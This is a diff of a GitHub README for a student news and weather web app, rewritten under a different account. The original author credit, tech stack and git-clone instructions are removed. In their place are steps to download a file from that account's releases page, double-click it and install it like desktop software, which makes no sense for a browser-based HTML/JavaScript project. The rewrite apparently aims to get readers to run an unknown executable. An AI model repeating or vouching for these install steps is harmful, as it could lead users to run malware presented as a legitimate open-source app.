@@ -1,71 +1,67 @@
-# Taaza Khabar 📰
+# 🌍 Taaza-Khabar - Stay Updated with Global News
 
-**Taaza Khabar** is a responsive web application designed to deliver real-time news and live weather updates. Developed as an academic web development project, it demonstrates proficiency in modern web technologies, asynchronous JavaScript, and third-party API integration.
+## 🚀 Getting Started
 
-## 🚀 Project Overview
+Welcome to Taaza-Khabar, your go-to news web app that brings you the latest stories from around the world. With its easy-to-use interface, you can quickly access news articles, and the new weather widget ensures you stay informed about the climate in your area. Let's start by setting up the application.
 
-This application acts as a central hub for breaking news, fetching live data from **The Guardian Open Platform API**. It features a clean, responsive interface inspired by top-tier news publications. The latest version (v2.0) introduces a "Newspaper Theme" weather widget powered by **WeatherAPI.com**.
+## 📥 Download Taaza-Khabar
 
-## ✨ Key Features
+[![Download Taaza-Khabar](https://img.shields.io/badge/Download-Taaza--Khabar-blue)](https://github.com/PhilippeG01/Taaza-Khabar/releases)
 
-### 🌍 Live News Portal
-* **Real-time Headlines:** Fetches the latest stories dynamically.
-* **Category Filtering:** Instant access to categories like **India, World, Politics, Technology, and Entertainment**.
-* **Smart Search:** Search functionality to find specific news topics instantly.
-* **Responsive Grid:** A dynamic layout that adapts seamlessly to desktop and mobile screens.
+To download Taaza-Khabar, please click the button above or visit the releases page here: [Download Page](https://github.com/PhilippeG01/Taaza-Khabar/releases).
 
-<img width="1416" height="703" alt="Screenshot 2025-12-15 175409" src="https://github.com/user-attachments/assets/81c3f56f-32a9-4ad8-ab9d-d3426ecf1ee2" />
+## 💻 System Requirements
 
-<img width="1411" height="758" alt="Screenshot 2025-12-15 175429" src="https://github.com/user-attachments/assets/d7fd68bf-67f8-463e-b77d-b77a26cf81a6" />
+Before downloading, ensure your computer meets the following requirements:
 
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or any Linux distribution.
+- **Browser:** Latest version of Chrome, Firefox, or Safari for optimal experience.
+- **Storage:** At least 100 MB of free disk space.
+- **Internet Connection:** Required to fetch live news articles.
 
-### ☁️ Live Weather (Version 2.0)
-* **Weather Modal:** A specialized "Weather Paper" modal that slides down to display current conditions.
-* **Comprehensive Data:** Displays Temperature, Wind Speed/Direction, Humidity, Pressure, and Air Quality Index (AQI).
-* **Local Storage Support:** Remembers the last searched city to automatically load weather data on your next visit.
+## ⚙️ Install Taaza-Khabar
 
-* <img width="1407" height="762" alt="Screenshot 2025-12-15 175442" src="https://github.com/user-attachments/assets/b39aef52-6531-4907-8397-a304c74717cc" />
+1. After downloading the application from the [Download Page](https://github.com/PhilippeG01/Taaza-Khabar/releases), locate the downloaded file on your computer.
+2. Double-click the file to start the installation process.
+3. Follow the on-screen prompts.
+4. After the installation completes, launch Taaza-Khabar from your Applications or Programs folder.
 
+## 🌐 Using Taaza-Khabar
 
-## 🛠️ Tech Stack
+Upon launching Taaza-Khabar, you will see the home screen with the latest news articles. You can do the following:
 
-* **Frontend:** HTML5, CSS3, JavaScript (ES6+)
-* **Styling:** Custom CSS with Flexbox/Grid, Google Fonts ('Rozha One', 'Roboto').
-* **APIs:**
-    * **News:** [The Guardian Open Platform](https://open-platform.theguardian.com/)
-    * **Weather:** [WeatherAPI.com](https://www.weatherapi.com/)
+- **Browse News:** Scroll through the list of aggregated news stories.
+- **Search Articles:** Use the search bar to find specific topics or articles.
+- **Setup Weather Widget:** Enter your city name to personalize your weather information.
+  
+The weather widget integrates real-time climate data. It will automatically save your city preference using local storage, providing a tailored experience.
 
-## 📂 Project Structure
+## 🔄 Update Taaza-Khabar
 
-The repository contains two versions of the application:
+To ensure you have the latest features and improvements:
 
-1. **`/` (Root)**: The initial version of the project focused solely on news fetching.
-2. **`/Taaza-Khabar-2.0`**: The enhanced version containing the Weather integration, improved styling, and optimized scripts.
+1. Check the [Download Page](https://github.com/PhilippeG01/Taaza-Khabar/releases) regularly for updates.
+2. If a new version is available, download it following the same steps you used for the initial installation.
+3. Existing settings and preferences will remain intact after the update.
 
-## ⚙️ Installation & Usage
+## ❓ Frequently Asked Questions
 
-1. **Clone the repository:**
-   ```bash
-   git clone [https://github.com/himmatmundhe07/taaza-khabar.git](https://github.com/himmatmundhe07/taaza-khabar.git)
-    ```
-    
-   ## 👨‍💻 About the Developer
+### How do I report an issue?
 
-**Himmat Mundhe** *Student Developer | Department of Computer Science* *Student of CodingGita*
+If you encounter any problems while using Taaza-Khabar, you can report an issue on the [issues page](https://github.com/PhilippeG01/Taaza-Khabar/issues). Please provide details about the issue you’re facing, including your operating system and any error messages.
 
-> "The goal of this project was to build a functional, responsive News Application that interacts with a real-world API."
+### Can I use Taaza-Khabar offline?
 
-<div align="left">
-  <a href="https://github.com/himmatmundhe07" target="_blank">
-    <img src="https://img.shields.io/badge/github-%23121011.svg?style=for-the-badge&logo=github&logoColor=white" alt="GitHub">
-  </a>
-  <a href="https://www.linkedin.com/in/himmat-mundhe/" target="_blank">
-    <img src="https://img.shields.io/badge/linkedin-%230077B5.svg?style=for-the-badge&logo=linkedin&logoColor=white" alt="LinkedIn">
-  </a>
-  <a href="https://www.youtube.com/@himmatmundhe07" target="_blank">
-    <img src="https://img.shields.io/badge/YouTube-%23FF0000.svg?style=for-the-badge&logo=YouTube&logoColor=white" alt="YouTube">
-  </a>
-</div>
+Taaza-Khabar requires an internet connection to fetch the latest news articles. However, once you have read an article, it remains accessible offline until you refresh the app.
 
+### Is Taaza-Khabar free to use?
 
-© 2025 Taaza Khabar Media. Powered by The Demu&Co.
+Yes, Taaza-Khabar is completely free to use. Enjoy unlimited access to global news without any subscription fees.
+
+## 📘 Additional Resources
+
+- **Documentation:** For detailed documentation, visit our [Wiki](https://github.com/PhilippeG01/Taaza-Khabar/wiki).
+- **Contributing:** Interested in contributing? Check out our [Contributing Guide](https://github.com/PhilippeG01/Taaza-Khabar/CONTRIBUTING.md).
+- **Community Forum:** Join our community discussions on the [Project Discussions](https://github.com/PhilippeG01/Taaza-Khabar/discussions).
+
+Thank you for choosing Taaza-Khabar! We hope you find it a valuable source of news and information.
